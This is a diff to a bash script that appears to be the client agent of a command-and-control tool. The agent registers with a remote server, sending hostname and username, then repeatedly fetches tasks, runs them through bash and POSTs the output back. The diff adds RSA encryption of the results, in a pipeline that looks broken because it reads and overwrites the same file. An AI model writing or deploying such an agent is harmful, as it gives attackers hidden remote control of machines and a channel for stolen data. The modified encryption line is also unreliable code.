@@ -4,6 +4,7 @@
 ip="REPLACE_IP"
 port="REPLACE_PORT"
 interface="REPLACE_INTERFACE"
+pub_key="REPLACE_PUB_KEY"
 n=.3
 
 #Define agent Registeration link
@@ -11,7 +12,7 @@ regl="http://$ip:$port/reg/"
 
 declare -A data=( [eth]=$interface [hname]=$(hostname) )
 
-#Get defined agent name (6 random characters)
+#Agent registration and Get defined agent name (6 random characters)
 name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami) $regl)
 
 #Define task, results links
@@ -28,7 +29,7 @@ do
     if [ -s /tmp/tasks ]; then
         #Execute tasks added
         cat /tmp/tasks | bash > /tmp/results
-        base64 /tmp/results > /tmp/enc-result
+        cat /tmp/results | openssl rsautl -encrypt -pubin -inkey <(echo "$pub_key") -out /tmp/results | base64 /tmp/results > /tmp/enc-result
         curl -X POST --data "@/tmp/enc-result" $resultl
     fi
     #Sleep for a while then continue the loop
